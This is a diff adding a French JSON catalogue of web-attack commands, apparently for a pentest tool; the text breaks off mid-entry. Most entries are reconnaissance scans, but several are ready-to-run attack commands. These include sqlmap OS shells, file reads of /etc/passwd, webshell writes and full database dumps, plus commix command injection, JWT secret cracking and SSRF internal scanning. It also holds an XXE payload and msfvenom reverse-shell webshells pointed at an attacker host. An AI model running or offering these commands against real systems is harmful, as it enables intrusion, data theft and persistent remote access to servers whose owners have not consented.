@@ -1,0 +1,1225 @@
+{
+  "label": "Attaque Web",
+  "icon": "🕸",
+  "commands": [
+    {
+      "id": "web_001",
+      "name": "Nikto — scan vulnérabilités web",
+      "short_name": "nikto",
+      "description": "Scanner de vulnérabilités web (fichiers exposés, misconfiguration, CVE)",
+      "command": "nikto -h http://$TARGET -o nikto_report.txt",
+      "purpose": "Détecter en-têtes manquants, répertoires exposés, fichiers sensibles, CVE connues sur serveurs web.",
+      "expected_output": "Liste de findings : fichiers exposés, vulnérabilités, en-têtes de sécurité manquants",
+      "risks": "Très bruyant — chaque requête est loggée. Peut être bloqué par WAF.",
+      "prerequisites": [
+        "nikto installé",
+        "Serveur web accessible"
+      ],
+      "tool_required": "nikto",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "web_attack",
+      "tags": [
+        "nikto",
+        "web",
+        "scan",
+        "vuln",
+        "http"
+      ]
+    },
+    {
+      "id": "web_002",
+      "name": "Gobuster — brute-force répertoires",
+      "short_name": "gobuster dir",
+      "description": "Force brute les répertoires et fichiers cachés d'un serveur web",
+      "command": "gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt",
+      "purpose": "Trouver des panneaux admin, fichiers de config, backups, APIs non documentées.",
+      "expected_output": "Chemins accessibles avec code HTTP (200, 301, 403…)",
+      "risks": "Génère des milliers de requêtes — visible dans les logs. Peut déclencher un ban IP.",
+      "prerequisites": [
+        "gobuster installé",
+        "Wordlist disponible (/usr/share/wordlists/)"
+      ],
+      "tool_required": "gobuster",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "web_attack",
+      "tags": [
+        "gobuster",
+        "dirbusting",
+        "web",
+        "fuzzing",
+        "wordlist"
+      ]
+    },
+    {
+      "id": "web_003",
+      "name": "SQLmap — injection SQL automatique",
+      "short_name": "sqlmap",
+      "description": "Détecte et exploite automatiquement les injections SQL",
+      "command": "sqlmap -u \"http://$TARGET/page?id=1\" --dbs --batch",
+      "purpose": "Identifier les bases de données accessibles via injection SQL. Extraction de données.",
+      "expected_output": "Bases de données listées, tables, colonnes. Données extraites si vulnérable.",
+      "risks": "Requêtes massives sur la cible. Peut corrompre des données avec --level élevé.",
+      "prerequisites": [
+        "sqlmap installé",
+        "URL avec paramètre injectable identifié"
+      ],
+      "tool_required": "sqlmap",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "category": "web_attack",
+      "tags": [
+        "sqlmap",
+        "sql",
+        "injection",
+        "database",
+        "web"
+      ]
+    },
+    {
+      "id": "web_004",
+      "name": "WPScan — audit WordPress",
+      "short_name": "wpscan",
+      "description": "Scanne un site WordPress pour vulnérabilités, plugins et utilisateurs",
+      "command": "wpscan --url http://$TARGET --enumerate u,p,t",
+      "purpose": "Détecter plugins vulnérables, thèmes obsolètes, utilisateurs WordPress, version core.",
+      "expected_output": "Version WP, plugins/thèmes avec CVE, liste d'utilisateurs énumérés",
+      "risks": "Visible dans les logs Apache/Nginx. Peut être bloqué par des plugins de sécurité.",
+      "prerequisites": [
+        "wpscan installé (gem install wpscan)",
+        "Site WordPress cible"
+      ],
+      "tool_required": "wpscan",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "web_attack",
+      "tags": [
+        "wpscan",
+        "wordpress",
+        "cms",
+        "web",
+        "plugins"
+      ]
+    },
+    {
+      "id": "web_005",
+      "name": "WhatWeb — fingerprinting web",
+      "short_name": "whatweb",
+      "description": "Identifie les technologies utilisées par un site web",
+      "command": "whatweb -a 3 http://$TARGET",
+      "purpose": "Détecter CMS, framework, serveur web, versions, plugins, CDN, WAF. Première étape de recon web.",
+      "expected_output": "WordPress 6.x, Apache 2.4, PHP 8.1, Cloudflare…",
+      "risks": "Faible — quelques requêtes HTTP seulement",
+      "prerequisites": [
+        "whatweb installé"
+      ],
+      "tool_required": "whatweb",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "web_attack",
+      "tags": [
+        "whatweb",
+        "fingerprint",
+        "web",
+        "cms",
+        "technology"
+      ]
+    },
+    {
+      "id": "web_006",
+      "name": "Wfuzz — fuzzing paramètres web",
+      "short_name": "wfuzz",
+      "description": "Fuzze des paramètres HTTP pour trouver des endpoints cachés ou des injections",
+      "command": "wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://$TARGET/FUZZ",
+      "purpose": "Tester chaque valeur d'une wordlist contre un paramètre. Utile pour LFI, SQLi, XXE, IDOR.",
+      "expected_output": "Réponses HTTP avec longueur / code différents de la baseline (404 filtré)",
+      "risks": "Beaucoup de requêtes — détectable. Peut provoquer des erreurs serveur.",
+      "prerequisites": [
+        "wfuzz installé",
+        "Wordlist disponible"
+      ],
+      "tool_required": "wfuzz",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "web_attack",
+      "tags": [
+        "wfuzz",
+        "fuzzing",
+        "lfi",
+        "sqli",
+        "web",
+        "wordlist"
+      ]
+    },
+    {
+      "id": "web_007",
+      "name": "Curl — requête HTTP manuelle",
+      "short_name": "curl -v",
+      "description": "Effectue une requête HTTP avec en-têtes et corps visibles",
+      "command": "curl -v -X GET http://$TARGET -H \"User-Agent: Mozilla/5.0\" 2>&1",
+      "purpose": "Tester manuellement une API ou un endpoint. Voir les en-têtes de réponse, cookies, redirections.",
+      "expected_output": "En-têtes HTTP complets + corps de réponse",
+      "risks": "Aucun risque — requête HTTP standard",
+      "prerequisites": [
+        "curl installé"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "web_attack",
+      "tags": [
+        "curl",
+        "http",
+        "api",
+        "headers",
+        "request"
+      ]
+    },
+    {
+      "id": "web_008",
+      "name": "Ffuf — fuzzing rapide",
+      "short_name": "ffuf",
+      "description": "Fuzzer web ultra-rapide (alternative à Gobuster/Wfuzz)",
+      "command": "ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$TARGET/FUZZ -mc 200,301,302",
+      "purpose": "Découvrir des répertoires, fichiers, sous-domaines ou paramètres cachés rapidement.",
+      "expected_output": "Chemins correspondants avec code HTTP, taille de réponse, mots",
+      "risks": "Très rapide donc très bruyant. Filtrer les faux positifs avec -mc / -fc / -fs.",
+      "prerequisites": [
+        "ffuf installé (apt install ffuf)"
+      ],
+      "tool_required": "ffuf",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "web_attack",
+      "tags": [
+        "ffuf",
+        "fuzzing",
+        "dirbusting",
+        "web",
+        "fast"
+      ]
+    },
+    {
+      "id": "web_009",
+      "name": "SearchSploit — chercher exploit",
+      "short_name": "searchsploit",
+      "description": "Recherche dans la base Exploit-DB locale pour un service ou logiciel",
+      "command": "searchsploit $SERVICE $VERSION",
+      "purpose": "Trouver des exploits publics pour un service identifié (ex: Apache 2.4.49, vsftpd 2.3.4).",
+      "expected_output": "Liste d'exploits disponibles avec leur chemin local EDB-ID",
+      "risks": "Lecture seule — aucun risque. Nécessite searchsploit à jour (--update).",
+      "prerequisites": [
+        "exploitdb installé (apt install exploitdb)",
+        "Base à jour"
+      ],
+      "tool_required": "searchsploit",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "web_attack",
+      "tags": [
+        "searchsploit",
+        "exploit-db",
+        "exploit",
+        "cve",
+        "web"
+      ]
+    },
+    {
+      "id": "web_010",
+      "name": "SSLyze — audit SSL/TLS",
+      "short_name": "sslyze",
+      "description": "Analyse la configuration SSL/TLS d'un serveur (ciphers, protocoles, certificat)",
+      "command": "sslyze --regular $TARGET:443",
+      "purpose": "Détecter SSLv3/TLS 1.0, chiffres faibles (RC4, DES), POODLE, Heartbleed, certificat expiré.",
+      "expected_output": "Protocoles supportés, cipher suites, vulnérabilités SSL (Heartbleed, ROBOT…)",
+      "risks": "Faible risque — quelques connexions TLS seulement",
+      "prerequisites": [
+        "sslyze installé (pip install sslyze)",
+        "Port 443 ouvert"
+      ],
+      "tool_required": "sslyze",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "web_attack",
+      "tags": [
+        "ssl",
+        "tls",
+        "sslyze",
+        "certificates",
+        "crypto"
+      ]
+    },
+    {
+      "id": "web_011",
+      "name": "Nuclei — scan de templates de vulnérabilités",
+      "short_name": "nuclei",
+      "description": "Lance des templates Nuclei ciblés contre une cible HTTP/HTTPS",
+      "command": "nuclei -u http://$TARGET -severity low,medium,high,critical",
+      "purpose": "Exécuter un balayage rapide de détections connues: exposures, CVE, panneaux admin, erreurs de configuration, prises d'empreinte.",
+      "expected_output": "Liste des findings avec template ID, sévérité et URL concernée",
+      "risks": "Peut générer beaucoup de requêtes et être détecté. Certains templates sont intrusifs selon leur catégorie.",
+      "prerequisites": [
+        "nuclei installé",
+        "templates Nuclei à jour"
+      ],
+      "tool_required": "nuclei",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "web_attack",
+      "tags": [
+        "nuclei",
+        "templates",
+        "cve",
+        "web",
+        "scan"
+      ]
+    },
+    {
+      "id": "web_012",
+      "name": "Dirsearch — brute-force de contenu web",
+      "short_name": "dirsearch",
+      "description": "Recherche des répertoires et fichiers cachés avec extensions courantes",
+      "command": "dirsearch -u http://$TARGET -e php,txt,zip,bak -w /usr/share/wordlists/dirb/common.txt",
+      "purpose": "Trouver rapidement des backups, endpoints oubliés, consoles d'administration et fichiers exposés.",
+      "expected_output": "Chemins trouvés avec code HTTP, taille, type de ressource",
+      "risks": "Bruyant: nombreuses requêtes HTTP. Peut déclencher une protection WAF ou du rate limiting.",
+      "prerequisites": [
+        "dirsearch installé",
+        "Wordlist disponible"
+      ],
+      "tool_required": "dirsearch",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "web_attack",
+      "tags": [
+        "dirsearch",
+        "dirbusting",
+        "content-discovery",
+        "web",
+        "backup"
+      ]
+    },
+    {
+      "id": "web_013",
+      "name": "ParamSpider — discovery de paramètres",
+      "short_name": "paramspider",
+      "description": "Récupère des URLs historiques et en extrait les paramètres potentiellement intéressants",
+      "command": "paramspider -d $DOMAIN",
+      "purpose": "Trouver rapidement des paramètres GET à tester pour XSS, IDOR, SQLi ou LFI à partir d'archives publiques.",
+      "expected_output": "URLs avec paramètres sauvegardées dans le dossier output de ParamSpider",
+      "risks": "Faible risque direct, mais dépend d'archives externes et peut générer du bruit réseau si rejoué ensuite.",
+      "prerequisites": [
+        "paramspider installé"
+      ],
+      "tool_required": "paramspider",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "web_attack",
+      "tags": [
+        "paramspider",
+        "parameters",
+        "xss",
+        "sqli",
+        "web"
+      ]
+    },
+    {
+      "id": "web_014",
+      "name": "Katana — crawling moderne de surface web",
+      "short_name": "katana",
+      "description": "Crawl rapide pour découvrir URLs, endpoints JS et routes cachées",
+      "command": "katana -u http://$TARGET -d 3 -jc",
+      "purpose": "Cartographier une application web moderne, y compris le parsing JavaScript pour enrichir la surface d'attaque.",
+      "expected_output": "Liste d'URLs, endpoints et ressources découvertes",
+      "risks": "Peut faire beaucoup de requêtes si profondeur élevée. Détectable côté application et WAF.",
+      "prerequisites": [
+        "katana installé"
+      ],
+      "tool_required": "katana",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "web_attack",
+      "tags": [
+        "katana",
+        "crawl",
+        "javascript",
+        "routes",
+        "web"
+      ]
+    },
+    {
+      "id": "web_015",
+      "name": "GAU — URLs historiques",
+      "short_name": "gau",
+      "description": "Récupère des URLs historiques via plusieurs sources publiques",
+      "command": "gau $DOMAIN | tee gau_$DOMAIN.txt",
+      "purpose": "Collecter rapidement des endpoints historiques à rejouer ensuite avec httpx, gf, dalfox ou d'autres outils de tri.",
+      "expected_output": "Liste d'URLs historiques sauvegardées dans gau_domain.txt",
+      "risks": "Faible risque direct. Les URLs récupérées peuvent toutefois cibler des surfaces sensibles si elles sont rejouées ensuite.",
+      "prerequisites": [
+        "gau installé"
+      ],
+      "tool_required": "gau",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "category": "web_attack",
+      "tags": [
+        "gau",
+        "urls",
+        "history",
+        "bugbounty",
+        "web"
+      ]
+    },
+    {
+      "id": "web_016",
+      "name": "Dalfox — scan XSS sur une URL",
+      "short_name": "dalfox url",
+      "description": "Teste une URL paramétrée pour détecter des vecteurs XSS réfléchis ou stockés",
+      "command": "dalfox url 'http://$TARGET/search?q=test'",
+      "purpose": "Vérifier rapidement si une URL avec paramètres est vulnérable à des injections XSS à l'aide d'un scanner spécialisé.",
+      "expected_output": "Paramètres testés avec éventuels payloads réussis et niveau de confiance",
+      "risks": "Intrusif: envoie des payloads d'injection XSS. À utiliser uniquement en contexte autorisé.",
+      "prerequisites": [
+        "dalfox installé",
+        "URL avec paramètres à tester"
+      ],
+      "tool_required": "dalfox",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "execution_policy": "dry_run_only",
+      "category": "web_attack",
+      "tags": [
+        "dalfox",
+        "xss",
+        "web",
+        "params",
+        "bugbounty"
+      ]
+    },
+    {
+      "id": "web_017",
+      "name": "WhatWeb — fingerprinting web",
+      "short_name": "whatweb",
+      "description": "Identifie les technologies d'un site web via ses signatures",
+      "command": "whatweb http://$TARGET",
+      "purpose": "Déterminer rapidement CMS, frameworks, versions apparentes et technologies exposées par une cible web.",
+      "expected_output": "Titre, serveur, technologies détectées, éventuels plugins/CMS",
+      "risks": "Faible risque: quelques requêtes HTTP de fingerprinting.",
+      "prerequisites": [
+        "whatweb installé"
+      ],
+      "tool_required": "whatweb",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "execution_policy": "safe",
+      "category": "web_attack",
+      "tags": [
+        "whatweb",
+        "fingerprint",
+        "cms",
+        "headers",
+        "web"
+      ]
+    },
+    {
+      "id": "web_018",
+      "name": "WAFW00F — détection de WAF",
+      "short_name": "wafw00f",
+      "description": "Détecte la présence probable d'un WAF devant une cible web",
+      "command": "wafw00f http://$TARGET",
+      "purpose": "Savoir si une application est protégée par Cloudflare, Imperva, F5, Akamai ou un autre WAF avant des tests plus poussés.",
+      "expected_output": "Nom probable du WAF détecté ou absence de détection",
+      "risks": "Faible risque: fingerprinting HTTP limité.",
+      "prerequisites": [
+        "wafw00f installé"
+      ],
+      "tool_required": "wafw00f",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "execution_policy": "safe",
+      "category": "web_attack",
+      "tags": [
+        "wafw00f",
+        "waf",
+        "fingerprint",
+        "web",
+        "protection"
+      ]
+    },
+    {
+      "id": "web_019",
+      "name": "Curl — en-têtes HTTP",
+      "short_name": "curl -I",
+      "description": "Récupère uniquement les en-têtes HTTP d'une cible web",
+      "command": "curl -I -L http://$TARGET",
+      "purpose": "Voir rapidement les redirections, l'en-tête Server, les politiques de sécurité et les cookies sans télécharger le corps de page.",
+      "expected_output": "HTTP/1.1 200/301..., Server, Location, Set-Cookie, CSP, HSTS",
+      "risks": "Faible risque: quelques requêtes HEAD/GET légères.",
+      "prerequisites": [
+        "curl installé"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "execution_policy": "safe",
+      "category": "web_attack",
+      "tags": [
+        "curl",
+        "headers",
+        "http",
+        "security",
+        "web"
+      ]
+    },
+    {
+      "id": "web_020",
+      "name": "Nmap NSE — scripts http sûrs",
+      "short_name": "nmap --script http-title,http-headers",
+      "description": "Exécute des scripts NSE de collecte HTTP non destructifs",
+      "command": "nmap -Pn -p 80,443 --script http-title,http-headers $TARGET",
+      "purpose": "Récupérer le titre HTTP et les en-têtes de réponse avec Nmap pour enrichir la reconnaissance web.",
+      "expected_output": "Titres HTTP et en-têtes principaux pour les ports 80/443 ouverts",
+      "risks": "Faible à modéré: quelques requêtes HTTP supplémentaires via Nmap.",
+      "prerequisites": [
+        "nmap installé"
+      ],
+      "tool_required": "nmap",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "execution_policy": "safe",
+      "category": "web_attack",
+      "tags": [
+        "nmap",
+        "nse",
+        "http-title",
+        "http-headers",
+        "web"
+      ]
+    },
+    {
+      "id": "web_021",
+      "name": "SQLmap — OS shell via injection",
+      "short_name": "sqlmap os-shell",
+      "description": "Obtient un shell OS via injection SQL et stacked queries",
+      "command": "sqlmap -u 'http://$TARGET/page?id=1' --os-shell --batch --random-agent",
+      "purpose": "Escalader une injection SQL en exécution de commandes OS",
+      "expected_output": "os-shell> — prompt shell sur le serveur web",
+      "risks": "Critique — RCE sur le serveur web, traces dans les logs",
+      "prerequisites": [
+        "injection SQL confirmée",
+        "DBMS avec stacked queries"
+      ],
+      "tool_required": "sqlmap",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "sqli",
+        "rce",
+        "web",
+        "sqlmap",
+        "os-shell"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "web_022",
+      "name": "SQLmap — lecture de fichier",
+      "short_name": "sqlmap file-read",
+      "description": "Lit /etc/passwd ou tout fichier via LOAD_FILE SQL",
+      "command": "sqlmap -u 'http://$TARGET/page?id=1' --file-read=/etc/passwd --batch",
+      "purpose": "Exfiltrer des fichiers sensibles via injection SQL",
+      "expected_output": "Content of /etc/passwd saved to ...",
+      "risks": "Élevé — exfiltration de fichiers système",
+      "prerequisites": [
+        "injection SQL confirmée",
+        "privilèges FILE sur DBMS"
+      ],
+      "tool_required": "sqlmap",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "sqli",
+        "file-read",
+        "web",
+        "sqlmap",
+        "lfi"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "web_023",
+      "name": "SQLmap — écriture de webshell",
+      "short_name": "sqlmap file-write",
+      "description": "Écrit un webshell PHP via injection SQL et INTO OUTFILE",
+      "command": "sqlmap -u 'http://$TARGET/page?id=1' --file-write=shell.php --file-dest=/var/www/html/shell.php --batch",
+      "purpose": "Déposer un webshell persistant via injection SQL",
+      "expected_output": "File written — accès via http://$TARGET/shell.php",
+      "risks": "Critique — RCE persistant via webshell",
+      "prerequisites": [
+        "injection SQL confirmée",
+        "privilèges FILE",
+        "dossier web writable"
+      ],
+      "tool_required": "sqlmap",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "sqli",
+        "webshell",
+        "rce",
+        "persistence",
+        "sqlmap"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "web_024",
+      "name": "Commix — injection de commande OS",
+      "short_name": "commix",
+      "description": "Détecte et exploite les injections de commande OS dans les paramètres web",
+      "command": "commix --url='http://$TARGET/page?cmd=test' --os-shell",
+      "purpose": "Automatiser l'exploitation des injections de commande",
+      "expected_output": "commix(os_shell)> — prompt shell interactif",
+      "risks": "Critique — RCE directe sur le serveur",
+      "prerequisites": [
+        "commix installé",
+        "paramètre injectable identifié"
+      ],
+      "tool_required": "commix",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "cmdi",
+        "rce",
+        "web",
+        "commix",
+        "os-injection"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "web_025",
+      "name": "JWT Tool — crack secret HS256",
+      "short_name": "jwt_tool crack",
+      "description": "Crack la clé secrète d'un JWT signé HS256 par dictionnaire",
+      "command": "python3 jwt_tool.py $TOKEN -C -d /usr/share/wordlists/rockyou.txt",
+      "purpose": "Récupérer la clé secrète JWT pour forger des tokens arbitraires",
+      "expected_output": "[+] SECRET KEY FOUND: password123",
+      "risks": "Élevé — forgé token = bypass auth complet",
+      "prerequisites": [
+        "jwt_tool installé",
+        "token JWT HS256 capturé"
+      ],
+      "tool_required": "python3",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "jwt",
+        "auth",
+        "crypto",
+        "crack",
+        "web"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "web_026",
+      "name": "Log4Shell — scanner CVE-2021-44228",
+      "short_name": "log4shell scan",
+      "description": "Teste la vulnérabilité Log4Shell via headers JNDI injectés",
+      "command": "nuclei -u http://$TARGET -t /root/nuclei-templates/cves/2021/CVE-2021-44228.yaml",
+      "purpose": "Détecter Log4Shell sur des applications Java",
+      "expected_output": "[critical] CVE-2021-44228 found at http://TARGET",
+      "risks": "Critique — CVE critique, RCE sans auth",
+      "prerequisites": [
+        "nuclei installé",
+        "templates nuclei à jour"
+      ],
+      "tool_required": "nuclei",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "log4shell",
+        "log4j",
+        "jndi",
+        "rce",
+        "cve-2021"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "web_027",
+      "name": "FFUF — LFI bruteforce",
+      "short_name": "ffuf lfi",
+      "description": "Brute-force de Local File Inclusion sur un paramètre web",
+      "command": "ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u 'http://$TARGET/page?file=FUZZ' -mc 200 -fs 0",
+      "purpose": "Découvrir une vulnérabilité LFI pour lire des fichiers serveur",
+      "expected_output": "[Status: 200] /etc/passwd trouvé",
+      "risks": "Élevé — lecture de fichiers sensibles (clés SSH, configs)",
+      "prerequisites": [
+        "ffuf installé",
+        "SecLists installé"
+      ],
+      "tool_required": "ffuf",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "lfi",
+        "ffuf",
+        "web",
+        "file-read",
+        "bruteforce"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "web_028",
+      "name": "SSRF — scan interne via paramètre web",
+      "short_name": "ssrf scan",
+      "description": "Utilise une SSRF pour scanner les services internes via l'application",
+      "command": "ffuf -w /tmp/ports.txt -u 'http://$TARGET/fetch?url=http://127.0.0.1:FUZZ' -mc 200 -fs 0",
+      "purpose": "Pivoter vers le réseau interne via une vulnérabilité SSRF",
+      "expected_output": "[Status: 200] Port 8080 accessible",
+      "risks": "Élevé — accès réseau interne via pivot applicatif",
+      "prerequisites": [
+        "ffuf installé",
+        "SSRF confirmée",
+        "fichier /tmp/ports.txt"
+      ],
+      "tool_required": "ffuf",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "ssrf",
+        "pivot",
+        "internal",
+        "web",
+        "ffuf"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "web_029",
+      "name": "GraphQL — introspection complète",
+      "short_name": "graphql introspect",
+      "description": "Dump le schéma GraphQL complet via introspection",
+      "command": "curl -s -X POST http://$TARGET/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{queryType{name}types{name fields{name args{name type{name kind ofType{name kind}}}}}}}\"}' | python3 -m json.tool",
+      "purpose": "Cartographier toutes les queries/mutations d'une API GraphQL",
+      "expected_output": "JSON avec types, champs, arguments de l'API",
+      "risks": "Moyen — révèle la structure interne de l'API",
+      "prerequisites": [
+        "curl installé",
+        "endpoint GraphQL identifié"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "tags": [
+        "graphql",
+        "api",
+        "introspection",
+        "recon",
+        "web"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "web_030",
+      "name": "Msfvenom — webshell PHP reverse",
+      "short_name": "msfvenom php",
+      "description": "Génère un webshell PHP reverse_tcp pour upload sur serveur web",
+      "command": "msfvenom -p php/reverse_tcp LHOST=$ATTACKER LPORT=$PORT -f raw -o shell.php",
+      "purpose": "Créer un webshell PHP pour obtenir un reverse shell après upload",
+      "expected_output": "shell.php généré — à uploader sur le serveur cible",
+      "risks": "Critique — webshell persistant sur le serveur",
+      "prerequisites": [
+        "metasploit installé"
+      ],
+      "tool_required": "msfvenom",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "webshell",
+        "php",
+        "msfvenom",
+        "reverse-shell",
+        "rce"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "web_031",
+      "name": "Msfvenom — payload ASP Windows",
+      "short_name": "msfvenom asp",
+      "description": "Génère un webshell ASP pour IIS Windows",
+      "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ATTACKER LPORT=$PORT -f asp -o shell.asp",
+      "purpose": "Créer un webshell ASP ciblant des serveurs IIS",
+      "expected_output": "shell.asp généré — à uploader sur IIS",
+      "risks": "Critique — shell Meterpreter persistant sur Windows IIS",
+      "prerequisites": [
+        "metasploit installé"
+      ],
+      "tool_required": "msfvenom",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "asp",
+        "iis",
+        "windows",
+        "msfvenom",
+        "webshell"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "web_032",
+      "name": "XSStrike — scan XSS avancé",
+      "short_name": "xsstrike",
+      "description": "Scanner XSS avancé avec contournement de WAF intégré",
+      "command": "python3 xsstrike.py -u 'http://$TARGET/search?q=test' --crawl -t 10",
+      "purpose": "Détecter et prouver des vulnérabilités XSS en contournant les WAF",
+      "expected_output": "Payload: <img src=x onerror=alert(1)> — XSS confirmed",
+      "risks": "Moyen — peut déclencher des alertes WAF/IDS",
+      "prerequisites": [
+        "XSStrike installé",
+        "paramètre cible identifié"
+      ],
+      "tool_required": "python3",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "tags": [
+        "xss",
+        "web",
+        "waf-bypass",
+        "xsstrike",
+        "injection"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "web_033",
+      "name": "Curl — CORS misconfiguration",
+      "short_name": "cors check",
+      "description": "Teste si l'API accepte des origins arbitraires dans CORS",
+      "command": "curl -s -I -H 'Origin: https://evil.com' http://$TARGET/api/v1/users | grep -i 'access-control'",
+      "purpose": "Identifier une misconfiguration CORS permettant vol de données",
+      "expected_output": "Access-Control-Allow-Origin: https://evil.com",
+      "risks": "Moyen — test passif, mais révèle une CORS exploitable",
+      "prerequisites": [
+        "curl installé",
+        "endpoint API identifié"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "tags": [
+        "cors",
+        "api",
+        "web",
+        "misconfiguration",
+        "javascript"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "web_034",
+      "name": "Curl — XXE via upload XML",
+      "short_name": "xxe injection",
+      "description": "Injecte une entité XML externe pour lire /etc/passwd",
+      "command": "curl -s -X POST http://$TARGET/upload -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'",
+      "purpose": "Exploiter une vulnérabilité XXE pour lire des fichiers système",
+      "expected_output": "root:x:0:0:root:/root:/bin/bash dans la réponse",
+      "risks": "Élevé — lecture de fichiers arbitraires, possible SSRF",
+      "prerequisites": [
+        "curl installé",
+        "endpoint XML identifié"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "xxe",
+        "xml",
+        "file-read",
+        "web",
+        "injection"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "web_035",
+      "name": "SQLmap — dump complet base de données",
+      "short_name": "sqlmap dump-all",
+      "description": "Dump toutes les tables de toutes les bases via injection SQL",
+      "command": "sqlmap -u 'http://$TARGET/page?id=1' --dump-all --batch --threads=5 --random-agent",
+      "purpose": "Exfiltrer l'intégralité des données via injection SQL",
+      "expected_output": "Fichiers CSV dans ~/.local/share/sqlmap/output/",
+      "risks": "Critique — exfiltration massive de données, très visible",
+      "prerequisites": [
+        "injection SQL confirmée"
+      ],
+      "tool_required": "sqlmap",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "sqli",
+        "dump",
+        "exfil",
+        "sqlmap",
+        "data"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "web_036",
+      "name": "Feroxbuster — brute-force récursif web",
+      "short_name": "feroxbuster",
+      "description": "Brute-force récursif des répertoires web — plus rapide que gobuster",
+      "command": "feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,txt,bak,zip -t 50 --depth 3",
+      "purpose": "Découvrir des fichiers et répertoires cachés de façon récursive",
+      "expected_output": "200 /admin/config.php, 200 /backup.zip",
+      "risks": "Moyen — génère un trafic important, visible dans les logs",
+      "prerequisites": [
+        "feroxbuster installé",
+        "SecLists installé"
+      ],
+      "tool_required": "feroxbuster",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "tags": [
+        "dirbusting",
+        "web",
+        "bruteforce",
+        "feroxbuster",
+        "recon"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "web_037",
+      "name": "Caido / Burp — one-liner MITM proxy",
+      "short_name": "mitm proxy curl",
+      "description": "Force curl à passer par un proxy pour capturer les requêtes",
+      "command": "curl -x http://127.0.0.1:8080 -k -s http://$TARGET/api/secret",
+      "purpose": "Intercepter et modifier les requêtes via Burp/Caido en ligne de commande",
+      "expected_output": "Requête visible dans Burp proxy listener",
+      "risks": "Moyen — MITM local pour inspection",
+      "prerequisites": [
+        "Burp Suite ou Caido lancé sur 8080"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": true,
